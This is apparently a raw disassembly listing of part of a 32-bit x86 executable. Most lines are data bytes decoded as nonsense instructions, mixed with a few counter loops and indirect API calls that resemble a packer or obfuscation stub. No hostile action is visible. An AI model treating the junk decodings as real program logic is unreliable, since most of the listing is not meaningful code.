  4081d0:	fstp   DWORD PTR [edx-0x4e]
  4081d3:	inc    esp
  4081d4:	xchg   esi,eax
  4081d5:	or     bh,BYTE PTR [edi+0x9]
  4081d8:	mov    cl,0x6
  4081da:	idiv   BYTE PTR [edi+ebx*2+0x35e4071f]
  4081e1:	adc    eax,0xdfd0a71
  4081e6:	test   al,0x15
  4081e8:	leave  
  4081e9:	in     al,dx
  4081ea:	nop
  4081eb:	mov    al,ds:0x5fa1cb2e
  4081f0:	shl    BYTE PTR [eax],1
  4081f2:	lahf   
  4081f3:	mov    eax,ds:0x4f92d9e3
  4081f8:	test   al,ah
  4081fa:	aad    0xea
  4081fc:	sub    ebx,ecx
  4081fe:	imul   edx,DWORD PTR [ebx+0x735eaf7a],0xa
  408205:	xchg   ebp,eax
  408206:	int3   
  408207:	daa    
  408208:	xor    DWORD PTR [edx+eax*8-0x6c],0x2bac2b1a
  408210:	shr    DWORD PTR [ecx+0x4f],cl
  408213:	inc    eax
  408214:	imul   edi,esp,0x97a74c6a
  40821a:	mov    ah,0x2c
  40821c:	push   0xffffffe6
  40821e:	sahf   
  40821f:	lods   al,BYTE PTR ds:[esi]
  408220:	mov    bl,0x84
  408222:	dec    ebx
  408223:	shl    DWORD PTR [ebx-0x1f],1
  408226:	int3   
  408227:	and    al,0xd5
  408229:	mov    eax,ds:0x72eb432f
  40822e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40822f:	xor    edi,DWORD PTR [eax]
  408231:	cmp    esp,DWORD PTR [eax+edi*2+0x41]
  408235:	ror    esi,1
  408237:	mov    dh,BYTE PTR [edi-0x4e]
  40823a:	add    DWORD PTR [ecx-0x21ad85e5],0xffffff8b
  408241:	loop   0x40823e
  408243:	(bad)  
  408244:	sub    DWORD PTR [ebx],ebp
  408246:	test   DWORD PTR [edx],edx
  408248:	jae    0x40821c
  40824a:	aad    0x1d
  40824c:	jge    0x408298
  40824e:	jo     0x408297
  408250:	mov    ds:0xe963212d,al
  408255:	aad    0x2e
  408257:	add    cl,BYTE PTR [edx-0x34]
  40825a:	aad    0x64
  40825c:	sbb    eax,edx
  40825e:	and    eax,0x8fa0bcf
  408263:	nop
  408264:	jp     0x4081f7
  408266:	sub    BYTE PTR [ebp+0x54e3b833],bh
  40826c:	leave  
  40826d:	aam    0x6b
  40826f:	or     eax,0xd23bc35f
  408274:	ss dec ecx
  408276:	lea    edx,[esi-0x4a]
  408279:	mov    bl,0x2a
  40827b:	jmp    0xde842d15
  408280:	int    0x36
  408282:	popa   
  408283:	push   ecx
  408284:	push   ds
  408285:	push   esi
  408286:	int    0x41
  408288:	(bad)  
  408289:	mov    eax,0xca46e058
  40828e:	dec    edi
  40828f:	and    al,0xab
  408291:	mov    dh,0x74
  408293:	sub    DWORD PTR [esi+0x1f],0xffffffb2
  408297:	pop    eax
  408298:	cmp    bh,BYTE PTR [edx]
  40829a:	add    ch,BYTE PTR [ebp-0x773e80d2]
  4082a0:	mov    bh,ah
  4082a2:	sub    al,0x8b
  4082a4:	(bad)  
  4082a5:	rcr    DWORD PTR [ebp+0x1be788d3],cl
  4082ab:	lods   eax,DWORD PTR ds:[esi]
  4082ac:	fnstenv [esi+esi*1-0x6811585e]
  4082b3:	aad    0x8c
  4082b5:	dec    edi
  4082b6:	xchg   edi,eax
  4082b7:	in     eax,0x4d
  4082b9:	pop    ss
  4082ba:	pop    esp
  4082bb:	std    
  4082bc:	cdq    
  4082bd:	sbb    al,0xa6
  4082bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082c0:	ret    0x6c5d
  4082c3:	dec    esi
  4082c4:	jmp    0x709d0cdc
  4082c9:	mov    ds:0xd8f9ef14,al
  4082cf:	xlat   BYTE PTR ds:[ebx]
  4082d0:	pop    edi
  4082d1:	sbb    eax,0xa0d7ed23
  4082d6:	gs repz push 0xffffff9b
  4082da:	addr16 mov edi,0xc1f1ba18
  4082e0:	mov    edx,0x79ada0fa
  4082e5:	inc    edx
  4082e6:	mov    cl,0x76
  4082e8:	xor    ebx,DWORD PTR [ebp-0x71472a47]
  4082ee:	pop    esp
  4082ef:	rcr    dh,cl
  4082f1:	mov    ebp,0x98d931e9
  4082f6:	mov    BYTE PTR [esi*8+0x7c48379c],ah
  4082fd:	cmp    eax,edi
  4082ff:	mov    BYTE PTR [edi],bl
  408301:	push   0x55
  408303:	cwde   
  408304:	push   0x2d
  408306:	cmp    DWORD PTR [esi+0x5c],eax
  408309:	aam    0x5e
  40830b:	in     eax,0xd2
  40830d:	and    DWORD PTR [edi-0x333d4f5e],esp
  408313:	mov    dh,0xe
  408315:	test   eax,0x27941821
  40831a:	mov    eax,0x18b4bc44
  40831f:	(bad)  
  408320:	and    BYTE PTR [edi-0x65],cl
  408323:	es push 0x428237a8
  408329:	out    dx,eax
  40832a:	int    0x5f
  40832c:	sub    ebp,ecx
  40832e:	pop    edx
  40832f:	mov    edi,0x4167e78b
  408334:	dec    ecx
  408335:	std    
  408336:	jne    0x408382
  408338:	jle    0x4082eb
  40833a:	pop    ds
  40833b:	hlt    
  40833c:	aas    
  40833d:	test   eax,0x33cd253f
  408342:	in     al,dx
  408343:	push   eax
  408344:	or     BYTE PTR [ebx+0x1810b9f8],0xcb
  40834b:	push   ebx
  40834c:	repz xor al,0xef
  40834f:	mov    eax,0xb7843c80
  408354:	xor    eax,edx
  408356:	cmp    eax,0x69ca0b32
  40835b:	je     0x4072df
  408361:	mov    eax,DWORD PTR [ebp-0x10]
  408364:	add    DWORD PTR [eax],0x7403504
  40836a:	jmp    0x4072df
  40836f:	mov    eax,DWORD PTR [ebp-0x1c]
  408372:	cmp    DWORD PTR [eax],edi
  408374:	je     0x4072df
  40837a:	mov    eax,0x800f1c81
  40837f:	jmp    0x4072e6
  408384:	push   ebp
  408385:	mov    ebp,esp
  408387:	sub    esp,0x60
  40838a:	mov    DWORD PTR ds:0x43456f,0x17
  408394:	cmp    DWORD PTR ds:0x43456f,0x0
  40839b:	je     0x4083fd
  4083a1:	cmp    DWORD PTR ds:0x43456f,0x6
  4083a8:	jne    0x4083c8
  4083ae:	push   0x4345d3
  4083b3:	push   0x4c23
  4083b8:	push   0x3f32
  4083bd:	push   0x4c42
  4083c2:	call   DWORD PTR ds:0x413288
  4083c8:	cmp    DWORD PTR ds:0x43456f,0x7
  4083cf:	jne    0x4083e0
  4083d5:	mov    eax,ds:0x43456f
  4083da:	dec    eax
  4083db:	mov    ds:0x43456f,eax
  4083e0:	mov    eax,ds:0x43456f
  4083e5:	dec    eax
  4083e6:	mov    ds:0x43456f,eax
  4083eb:	jmp    0x408394
  4083f0:	movzx  eax,BYTE PTR ds:0x434693
  4083f7:	sbb    DWORD PTR ds:0x434583,eax
  4083fd:	mov    eax,DWORD PTR [ebp+0x8]
  408400:	sbb    DWORD PTR ds:0x434607,0x4487
  40840a:	push   ebx
  40840b:	xor    ebx,ebx
  40840d:	or     ebx,DWORD PTR ds:0x434603
  408413:	sbb    DWORD PTR ds:0x434693,ebx
  408419:	push   esi
  40841a:	jmp    0x4086a2
  40841f:	jmp    DWORD PTR [ecx]
  408421:	lahf   
  408422:	xchg   esp,eax
  408423:	mov    eax,ds:0xe73db59c
  408428:	sbb    bh,bl
  40842a:	(bad)  
  40842b:	cmp    DWORD PTR [ebp+0x30],0x7edefb7e
  408432:	jle    0x408415
  408434:	js     0x4084b4
  408436:	jle    0x4084ab
  408438:	push   esp
  408439:	push   ds
  40843a:	push   cs
  40843b:	xor    al,0x3b
  40843d:	mov    ah,0xa9
  40843f:	lock stc 
  408441:	(bad)  
  408442:	into   
  408443:	xchg   DWORD PTR [ebp-0x2e122a0b],ebp
  408449:	hlt    
  40844a:	xchg   edi,eax
  40844b:	cmp    al,0xf4
  40844d:	fiadd  DWORD PTR [ebx]
  40844f:	repz lds esp,FWORD PTR [ebx]
  408452:	ret    
  408453:	int    0x13
  408455:	pop    es
  408456:	mov    eax,es
  408458:	inc    edi
  40845a:	mov    al,ds:0x9049c397
  40845f:	xchg   ebp,eax
  408460:	inc    eax
  408461:	or     BYTE PTR [ebx+0x34],0x66
  408465:	jns    0x40843d
  408467:	jb     0x40843d
  408469:	pop    ecx
  40846a:	dec    edi
  40846b:	xor    al,0x96
  40846d:	inc    ecx
  40846e:	add    bl,BYTE PTR [edi]
  408470:	daa    
  408471:	retf   0x2791
  408474:	push   ebx
  408475:	sbb    al,BYTE PTR [edx]
  408477:	ins    DWORD PTR es:[edi],dx
  408478:	mov    ah,0xfc
  40847a:	dec    edx
  40847b:	(bad)  
  40847c:	(bad)  
  40847d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40847e:	inc    ebx
  40847f:	fprem  
  408481:	sub    bl,BYTE PTR [ebp+0x35]
  408484:	add    edi,edx
  408486:	mov    ebx,0xbe41410
  40848b:	sub    DWORD PTR [ebp-0x66],edi
  40848e:	jl     0x40841b
  408490:	div    DWORD PTR [edi+eiz*4+0x1]
  408494:	(bad)  
  408495:	and    ch,BYTE PTR [edi+0x63214d27]
  40849b:	cld    
  40849c:	out    dx,eax
  40849d:	and    DWORD PTR [ebx-0x37],esp
  4084a0:	inc    ebp
  4084a1:	and    edi,DWORD PTR [esi+0x763eb246]
  4084a7:	cmp    cl,0xbf
  4084aa:	jbe    0x40843b
  4084ac:	jge    0x4084d1
  4084ae:	ins    DWORD PTR es:[edi],dx
  4084af:	and    DWORD PTR [eax],ebx
  4084b1:	xor    al,0x9c
  4084b3:	inc    esi
  4084b4:	add    edi,ebp
  4084b6:	and    DWORD PTR [eax+0x6565a075],ebp
  4084bc:	or     eax,0xdf1c851e
  4084c1:	pusha  
  4084c2:	adc    bh,bh
  4084c4:	dec    edi
  4084c5:	ror    esp,0x50
  4084c8:	pusha  
  4084c9:	cdq    
  4084ca:	jo     0x4084aa
  4084cc:	scas   eax,DWORD PTR es:[edi]
  4084cd:	xchg   ebp,eax
  4084ce:	jmpw   0xfb1f
  4084d2:	mov    ds:0x61ecf187,eax
  4084d7:	hlt    
  4084d8:	jae    0x408517
  4084da:	add    DWORD PTR [ebx-0x21],ebx
  4084dd:	fcomp  QWORD PTR [edi]
  4084df:	sub    ah,ch
  4084e1:	jo     0x4084f2
  4084e3:	cmp    al,0xbd
  4084e5:	and    BYTE PTR [eax+0x3],dh
  4084e8:	outs   dx,DWORD PTR ds:[esi]
  4084e9:	clc    
  4084ea:	adc    DWORD PTR [eax],esp
  4084ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084ed:	ret    0x395c
  4084f0:	gs pop edi
  4084f2:	out    0x7,al
  4084f4:	fsubr  st,st(7)
  4084f6:	jmp    0x8f1d:0xa5de6d79
  4084fd:	clc    
  4084fe:	sbb    BYTE PTR [eax+0x1c1e0835],0x67
  408505:	arpl   sp,sp
  408507:	das    
  408508:	out    0x8c,eax
  40850a:	fs cmp al,0x69
  40850d:	and    al,0x3
  40850f:	jmp    0x7515:0x3227f439
  408516:	adc    al,0x4e
  408518:	inc    esi
  408519:	mov    edi,DWORD PTR [edi+0x154be583]
  40851f:	test   BYTE PTR [edi+0x58],dh
  408522:	addr16 push ecx
  408524:	fistp  QWORD PTR [edx+0x3807bebe]
  40852a:	xchg   edi,eax
  40852b:	dec    eax
  40852c:	lods   eax,DWORD PTR ds:[esi]
  40852d:	add    eax,0x6d308999
  408532:	pop    ebp
  408533:	or     eax,0xb3fd774d
  408538:	mov    ecx,?
  40853a:	mov    DWORD PTR [edx+0x6e759371],0x5f17d7f5
  408544:	add    eax,0x3ebc359b
  408549:	pop    ds
  40854a:	jge    0x408548
  40854c:	pop    ds
  40854d:	test   ah,dl
  40854f:	lock clc 
  408551:	jmp    0x94fa:0x3bd64b21
  408558:	repnz cdq 
  40855a:	sub    eax,0xbf16ec54
  40855f:	xchg   BYTE PTR [ecx],cl
  408561:	cs repz xchg esi,eax
  408564:	dec    edi
  408565:	dec    ecx
  408566:	mov    esp,esi
  408568:	dec    eax
  408569:	int    0x79
  40856b:	scas   al,BYTE PTR es:[edi]
  40856c:	pop    ecx
  40856d:	std    
  40856e:	fsubr  DWORD PTR [esi-0x1959cc05]
  408574:	popa   
  408575:	(bad)  
  408576:	sti    
  408577:	push   0xf56d861e
  40857c:	xchg   esp,eax
  40857d:	cmp    dh,BYTE PTR [eax]
  40857f:	and    edx,ebx
  408581:	pop    esi
  408582:	js     0x4085a5
  408584:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408585:	cmp    BYTE PTR [edi],bh
  408587:	int    0x59
  408589:	ret    0xb789
  40858c:	add    al,0xe2
  40858e:	gs cmp eax,0x6c20fe69
  408594:	sub    DWORD PTR [ebx],esp
  408596:	jecxz  0x4085f3
  408598:	pop    ds
  408599:	in     al,0x57
  40859b:	ret    0xa42a
  40859e:	lods   al,BYTE PTR ds:[esi]
  40859f:	jbe    0x408555
  4085a1:	xchg   edi,eax
  4085a2:	cmp    ch,cl
  4085a4:	xor    DWORD PTR [edx+0x45],edi
  4085a7:	sub    eax,0x8416fbc3
  4085ac:	jb     0x4085b6
  4085ae:	arpl   ax,dx
  4085b0:	(bad)  
  4085b1:	cmp    BYTE PTR [ecx],dl
  4085b3:	cmp    DWORD PTR [ecx+0x3b151fa],esp
  4085b9:	sub    esp,DWORD PTR [esi+0x41396903]
  4085bf:	push   ebp
  4085c0:	push   esp
  4085c1:	mov    ah,0x8c
  4085c3:	ror    DWORD PTR [eax],cl
  4085c5:	ror    BYTE PTR [edi-0x35],cl
  4085c8:	das    
  4085c9:	add    cl,ah
  4085cb:	sti    
  4085cc:	arpl   cx,sp
  4085ce:	jmp    0xa944:0x9d42e0b7
  4085d5:	sub    edx,DWORD PTR [ecx]
  4085d7:	scas   eax,DWORD PTR es:[edi]
  4085d8:	shr    BYTE PTR [eax-0x31],1
  4085db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085dc:	lahf   
  4085dd:	out    dx,eax
  4085de:	inc    edi
  4085df:	inc    DWORD PTR [edi+0x8]
  4085e2:	lods   eax,DWORD PTR ds:[esi]
  4085e3:	xchg   ebp,eax
  4085e4:	imul   eax,DWORD PTR [edi],0x6bb0baa5
  4085ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085eb:	lds    ecx,FWORD PTR [eax]
  4085ed:	adc    al,0x48
  4085ef:	push   ebp
  4085f0:	scas   al,BYTE PTR es:[edi]
  4085f1:	inc    eax
  4085f2:	dec    ebp
  4085f3:	hlt    
  4085f4:	daa    
  4085f5:	inc    edx
  4085f6:	daa    
  4085f7:	push   0x108b4b3f
  4085fc:	les    ebx,FWORD PTR [edi-0x7f094478]
  408602:	mov    al,0xb2
  408604:	jo     0x408657
  408606:	mov    dl,0x5
  408608:	add    eax,0xc5f87889
  40860d:	mov    edi,0xf2238cca
  408612:	pop    ebx
  408613:	xchg   BYTE PTR [eax+0x2803b978],al
  408619:	lock gs push esi
  40861d:	enter  0x83ac,0x86
  408621:	push   esp
  408622:	push   esp
  408623:	jmp    FWORD PTR [ecx]
  408625:	push   esi
  408626:	adc    ebp,eax
  408628:	dec    ecx
  408629:	and    eax,0xef3cd416
  40862e:	popa   
  40862f:	(bad)  
  408631:	dec    esi
  408632:	ret    0xc9b6
  408635:	ins    DWORD PTR es:[edi],dx
  408636:	in     eax,0x9f
  408638:	jne    0x4086a6
  40863a:	inc    esi
  40863b:	push   edi
  40863c:	jo     0x40866c
  40863e:	inc    edx
  40863f:	(bad)  
  408641:	pusha  
  408642:	mov    al,ds:0xf98cbcfc
  408647:	aad    0x62
  408649:	push   esp
  40864a:	push   eax
  40864b:	scas   eax,DWORD PTR es:[edi]
  40864c:	jno    0x40862b
  40864e:	mov    BYTE PTR [esi+0x2b4c3194],0xe1
  408655:	xchg   edi,eax
  408656:	ret    
  408657:	mov    DWORD PTR [edx+0x1b129a79],edx
  40865d:	inc    edx
  40865e:	push   edx
  40865f:	pushf  
  408660:	pop    ebp
  408661:	pop    ebx
  408662:	push   0x73d39141
  408667:	sub    al,dh
  408669:	push   esi
  40866a:	loop   0x408641
  40866c:	mov    edx,0xfd9662b4
  408671:	mov    edx,0xbe649e34
  408676:	sbb    BYTE PTR [edx-0x18],0x26
  40867a:	inc    esp
  40867c:	cmp    BYTE PTR [edx],dh
  40867e:	or     ch,ah
  408680:	mov    ds:0xf756bc99,al
  408685:	xchg   ecx,eax
  408686:	push   esp
  408687:	mov    al,ds:0xafef9bbf
  40868c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40868d:	xor    al,0xce
  40868f:	pop    ecx
  408690:	add    cl,bh
  408692:	hlt    
  408693:	(bad)  
  408694:	jae    0x4086c4
  408696:	loope  0x4086f7
  408698:	cdq    
  408699:	test   DWORD PTR [esp-0x78],ebp
  40869d:	mov    esp,0xf0ca3c38
  4086a2:	mov    esi,0x7510851
  4086a7:	and    DWORD PTR ds:0x43456f,0x0
  4086b1:	mov    ebx,DWORD PTR ds:0x43456f
  4086b7:	inc    ebx
  4086b8:	mov    DWORD PTR ds:0x43456f,ebx
  4086be:	cmp    DWORD PTR ds:0x43456f,0x8
  4086c5:	jne    0x4086d6
  4086cb:	push   0x2214
  4086d0:	call   DWORD PTR ds:0x41328c
  4086d6:	cmp    DWORD PTR ds:0x43456f,0x7
  4086dd:	jne    0x4086f2
  4086e3:	xor    ebx,ebx
  4086e5:	or     ebx,DWORD PTR ds:0x43456f
  4086eb:	inc    ebx
  4086ec:	mov    DWORD PTR ds:0x43456f,ebx
  4086f2:	cmp    DWORD PTR ds:0x43456f,0x11
  4086f9:	jb     0x4086b1
  4086ff:	xor    eax,esi
  408701:	or     ebx,0x4275
  408707:	mov    ebx,0x327299
  40870c:	add    eax,ebx
  40870e:	push   edi
  40870f:	sub    edi,DWORD PTR ds:0x434603
  408715:	mov    DWORD PTR [ebp-0x18],eax
  408718:	xor    edi,0x561f
  40871e:	jmp    0x4089a6
  408723:	push   esi
  408724:	ja     0x40875d
  408726:	push   ecx
  408727:	aaa    
  408728:	push   ecx
  408729:	jo     0x40879c
  40872b:	(bad)  
  40872c:	mov    eax,0x10793fc8
  408731:	(bad)  
  408732:	fwait
  408733:	outs   dx,BYTE PTR ds:[esi]
  408734:	fdivr  DWORD PTR [esi+0x7e]
  408737:	loope  0x4087b1
  408739:	jle    0x4087b9
  40873b:	cmp    esp,eax
  40873d:	xchg   esp,eax
  40873e:	push   ds
  40873f:	sbb    al,0xfd
  408741:	adc    al,0x77
  408743:	out    0xb1,al
  408745:	jmp    0xb148:0x4097eba7
  40874c:	clc    
  40874d:	pushf  
  40874e:	nop
  40874f:	dec    edx
  408750:	imul   ebx,edx,0x68e91194
  408756:	stc    
  408757:	stos   DWORD PTR es:[edi],eax
  408758:	xchg   edx,eax
  408759:	clc    
  40875a:	mov    BYTE PTR [ecx-0x26],0x6b
  40875e:	jne    0x4087b0
  408760:	add    DWORD PTR ds:0x5a8131cc,ecx
  408766:	lods   al,BYTE PTR ds:[esi]
  408767:	pop    edx
  408768:	inc    edi
  408769:	out    dx,eax
  40876a:	mov    dh,0x8b
  40876c:	cmp    eax,0xaa50e0af
  408771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408772:	dec    edi
  408773:	inc    ecx
  408774:	mov    dl,0x1d
  408776:	cli    
  408777:	sub    al,ah
  408779:	jne    0x408785
  40877b:	inc    ecx
  40877c:	lods   eax,DWORD PTR ds:[esi]
  40877d:	push   esi
  40877e:	(bad)  
  40877f:	or     dl,dh
  408781:	sar    al,cl
  408783:	hlt    
  408784:	push   esp
  408785:	mov    ecx,0x55358ece
  40878b:	xor    edi,DWORD PTR [edx-0xfa42297]
  408791:	and    bh,BYTE PTR [ecx-0x75]
  408794:	les    edi,FWORD PTR [esi+ecx*1]
  408797:	dec    esi
  408798:	leave  
  408799:	inc    DWORD PTR [ecx]
  40879b:	loop   0x40877a
  40879d:	lods   al,BYTE PTR ds:[esi]
  40879e:	(bad)  
  40879f:	fsub   QWORD PTR [esp+eiz*4-0x2894e12d]
  4087a6:	push   ds
  4087a7:	aas    
  4087a8:	inc    edi
  4087a9:	cmp    ebx,DWORD PTR [edx]
  4087ab:	mov    eax,0xc43b9338
  4087b0:	pop    eax
  4087b1:	push   ebx
  4087b2:	call   0xc002:0x9f58f833
  4087b9:	dec    ebp
  4087ba:	cmp    bh,cl
  4087bc:	(bad)  
  4087bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087be:	dec    ecx
  4087bf:	aam    0x39
  4087c1:	dec    esi
  4087c2:	arpl   WORD PTR ds:0x13ebd2ea,di
  4087c8:	ds loopne 0x408792
  4087cb:	ds mov al,0xde
  4087ce:	scas   al,BYTE PTR es:[edi]
  4087cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4087d0:	stos   DWORD PTR es:[edi],eax
  4087d1:	dec    ebx
  4087d2:	pop    ebx
  4087d3:	pop    edx
  4087d4:	xchg   ebx,eax
  4087d5:	loop   0x40879e
  4087d7:	out    0x21,al
  4087d9:	and    BYTE PTR [edi+0x2b],cl
  4087dc:	sbb    eax,0x9745bbac
  4087e1:	pushf  
  4087e2:	or     eax,0x68927e6a
  4087e7:	mov    dh,0x78
  4087e9:	ss mov esp,edi
  4087ec:	sbb    DWORD PTR [edi+0x3191420],0xc228bcc9
  4087f6:	rcl    ah,0x94
  4087f9:	repnz int3 
  4087fb:	pop    edx
  4087fc:	sub    eax,0x61164f40
  408801:	adc    al,0x6b
  408803:	test   eax,0xdf4978a2
  408808:	pop    esp
  408809:	fidivr WORD PTR [esi-0x53]
  40880c:	test   eax,0x59e2f46d
  408811:	lea    esp,ds:[edi-0x4b927f2f]
  408818:	rcl    BYTE PTR [eax-0x76649ddc],0x9d
  40881f:	loop   0x408894
  408821:	lock test DWORD PTR [ebx],ebx
  408824:	fnsave [esi-0x28]
  408827:	nop
  408828:	ret    0x5a9d
  40882b:	sti    
  40882c:	cdq    
  40882d:	jns    0x4087ea
  40882f:	adc    edi,DWORD PTR [eax-0x6b]
  408832:	pop    esi
  408833:	cmp    DWORD PTR [ecx+ecx*8-0x26],ebx
  408837:	inc    edx
  408838:	call   0xd8137cc2
  40883d:	popf   
  40883e:	lahf   
  40883f:	jecxz  0x408814
  408841:	inc    ebx
  408842:	push   esi
  408843:	je     0x408803
  408845:	inc    edi
  408846:	fsub   QWORD PTR [edi-0x405835bd]
  40884c:	out    0xc1,al
  40884e:	pop    esp
  40884f:	mov    ds,esi
  408851:	(bad)  
  408852:	retf   0x376b
  408855:	sub    ch,dl
  408857:	sub    al,0xea
  408859:	(bad)  
  40885a:	das    
  40885b:	(bad)  
  40885c:	out    dx,eax
  40885d:	jl     0x408857
  40885f:	pop    ecx
  408860:	jb     0x408861
  408862:	mov    dl,0x3d
  408864:	and    al,0x74
  408866:	test   DWORD PTR [edi+0x36],edx
  408869:	ds xchg esp,eax
  40886b:	jne    0x40889f
  40886d:	jecxz  0x4087f7
  40886f:	ret    0x17be
  408872:	in     al,dx
  408873:	dec    ebp
  408874:	or     al,0x4c
  408876:	retf   
  408877:	jno    0x408894
  408879:	(bad)  
  40887a:	repz xor BYTE PTR [edi],dl
  40887d:	add    ecx,esi
  40887f:	xlat   BYTE PTR ds:[ebx]
  408880:	daa    
  408881:	cwd    
  408883:	fs jecxz 0x408833
  408886:	push   0x2ae0abf6
  40888b:	xchg   ecx,eax
  40888c:	pop    es
  40888d:	dec    esp
  40888e:	jnp    0x4088c0
  408890:	lea    esp,fs:[esi+0x2ef7575c]
  408897:	or     edx,edx
  408899:	or     BYTE PTR [edi],dl
  40889b:	stos   BYTE PTR es:[edi],al
  40889c:	mov    ecx,0xa2c47bbf
  4088a1:	cdq    
  4088a2:	sub    DWORD PTR [edi+0x21b5bf04],ecx
  4088a8:	ins    DWORD PTR es:[edi],dx
  4088a9:	or     al,0xa8
  4088ab:	ss jbe 0x4088ec
  4088ae:	outs   dx,BYTE PTR ds:[esi]
  4088af:	xor    DWORD PTR [edx],ebx
  4088b1:	push   ebx
  4088b2:	shr    BYTE PTR [eax-0x66],1
  4088b5:	dec    ebx
  4088b6:	in     eax,0x31
  4088b8:	adc    eax,0x81a08831
  4088bd:	repnz bound ebp,QWORD PTR ds:0x5d0c6376
  4088c4:	mov    dh,0xeb
  4088c6:	sub    edi,esi
  4088c8:	mov    cl,dl
  4088ca:	xchg   esi,eax
  4088cb:	push   esi
  4088cc:	jae    0x4088c5
  4088ce:	mov    ch,0x9b
  4088d0:	ds (bad) 
  4088d2:	mov    edx,0x761324cc
  4088d7:	(bad)  
  4088d8:	push   ecx
  4088d9:	xchg   DWORD PTR [ebp+edi*4+0x28],eax
  4088dd:	mov    esi,0xe3c0aab4
  4088e2:	addr16 in eax,0x74
  4088e5:	in     eax,dx
  4088e6:	mov    al,ds:0x4855beb0
  4088eb:	in     eax,0x86
  4088ed:	pop    ebx
  4088ee:	add    edi,DWORD PTR [esi-0x68]
  4088f1:	sub    BYTE PTR [ebx-0x61],ah
  4088f4:	push   edx
  4088f5:	jbe    0x40888f
  4088f7:	jns    0x4088cd
  4088f9:	push   edi
  4088fa:	nop
  4088fb:	ja     0x4088a3
  4088fd:	hlt    
  4088fe:	mov    ch,0x1d
  408900:	pop    edx
  408901:	sub    DWORD PTR ds:0x2ab4c4ea,edi
  408907:	xchg   edi,eax
  408908:	mov    bh,0x66
  40890a:	nop
  40890b:	imul   esp,DWORD PTR [esi],0xb8c4f79a
  408911:	mov    edi,0x28e799e2
  408916:	or     eax,edi
  408918:	dec    edx
  408919:	arpl   WORD PTR [ebp-0x2aac5fc7],dx
  40891f:	lock jp 0x408982
  408922:	push   esi
  408923:	int3   
  408924:	in     al,0x3f
  408926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408927:	sub    BYTE PTR [eax],cl
  408929:	pminsw mm0,QWORD PTR [edx+edi*8]
  40892d:	js     0x408992
  40892f:	ja     0x4089a8
  408931:	pop    ecx
  408932:	mov    bh,0x96
  408934:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408935:	xor    al,BYTE PTR [ecx]
  408937:	mov    ebp,0x322fc056
  40893c:	sub    bh,BYTE PTR [ebx+0x1e]
  40893f:	inc    edi
  408940:	mov    ebp,0x3ef4264
  408945:	adc    bl,BYTE PTR [eax]
  408947:	rcr    BYTE PTR [ecx-0x7016028e],cl
  40894d:	mov    DWORD PTR ss:[eax],esi
  408950:	cs fs jmp 0x408938
  408954:	outs   dx,BYTE PTR ds:[esi]
  408955:	xchg   esi,eax
  408956:	scas   al,BYTE PTR es:[edi]
  408957:	mov    bh,0xd3
  408959:	pop    ss
  40895a:	call   0xa2ac6f51
  40895f:	test   BYTE PTR [esi],dl
  408961:	addr16 js 0x4089d4
  408964:	push   ebp
  408965:	adc    al,dl
  408967:	(bad)  
  408969:	push   ecx
  40896a:	mov    ah,0x86
  40896c:	add    edi,DWORD PTR ds:0xf25401ae
  408972:	cli    
  408973:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408974:	dec    BYTE PTR [ecx+ebp*2+0x7b0d9420]
  40897b:	scas   al,BYTE PTR es:[edi]
  40897c:	ins    DWORD PTR es:[edi],dx
  40897d:	in     al,0x21
  40897f:	dec    ebx
  408980:	neg    BYTE PTR [ecx-0x6ca722a4]
  408986:	ja     0x4089b1
  408988:	clc    
  408989:	dec    ebp
  40898a:	mov    cl,BYTE PTR [edx]
  40898c:	dec    ebx
  40898d:	or     BYTE PTR [ebx],0xad
  408990:	retf   
  408991:	inc    edi
  408992:	fwait
  408993:	xchg   ecx,eax
  408994:	lods   eax,DWORD PTR gs:[esi]
  408996:	ds mov ecx,0xfeb3323d
  40899c:	ins    DWORD PTR es:[edi],dx
  40899d:	or     al,0x2
  40899f:	jbe    0x4089cf
  4089a1:	stos   DWORD PTR es:[edi],eax
  4089a2:	mov    esp,0x8b223439
  4089a7:	jge    0x4089b1
  4089a9:	xor    edi,esi
  4089ab:	not    DWORD PTR ds:0x43456b
  4089b1:	mov    DWORD PTR [ebp-0xc],0xf89c85f6
  4089b8:	mov    DWORD PTR [ebp-0x10],0xf89c8736
  4089bf:	add    edi,ebx
  4089c1:	jmp    0x4092cd
  4089c6:	cmp    edi,0x3f
  4089c9:	jmp    0x408c51
  4089ce:	adc    dl,BYTE PTR [ebx-0x524adccb]
  4089d4:	sbb    al,0xb3
  4089d6:	xchg   ebx,eax
  4089d7:	pop    ds
  4089d8:	adc    cl,cl
  4089da:	cmp    DWORD PTR [edi],esi
  4089dc:	in     al,0x9d
  4089de:	rcr    ebx,1
  4089e0:	jle    0x408a60
  4089e2:	loope  0x408a5c
  4089e4:	jle    0x408a64
  4089e6:	pop    ds
  4089e7:	(bad)  
  4089e8:	sub    eax,0x460dc37f
  4089ed:	test   eax,0x19c41aa5
  4089f2:	(bad)  
  4089f3:	xlat   BYTE PTR ds:[ebx]
  4089f4:	xor    eax,DWORD PTR [ebx]
  4089f6:	push   ds
  4089f7:	fld1   
  4089f9:	xor    al,BYTE PTR [ecx]
  4089fb:	popf   
  4089fc:	inc    edi
  4089fd:	repz inc ebx
  4089ff:	or     eax,0x1c42cfcf
  408a04:	inc    ebp
  408a05:	sbb    ecx,DWORD PTR [ebx+0x33]
  408a08:	cmp    ebp,ebp
  408a0a:	xor    eax,0x90a1ef50
  408a0f:	stc    
  408a10:	cmp    DWORD PTR [si-0x1a92],ebx
  408a15:	fadd   QWORD PTR ds:0x7fa29538
  408a1b:	dec    edi
  408a1c:	xchg   esp,eax
  408a1d:	addr16 add eax,0x2a5c64f9
  408a23:	inc    BYTE PTR [ebx-0x5a]
  408a26:	cmp    DWORD PTR [ecx+0x8810a61],0xd0721757
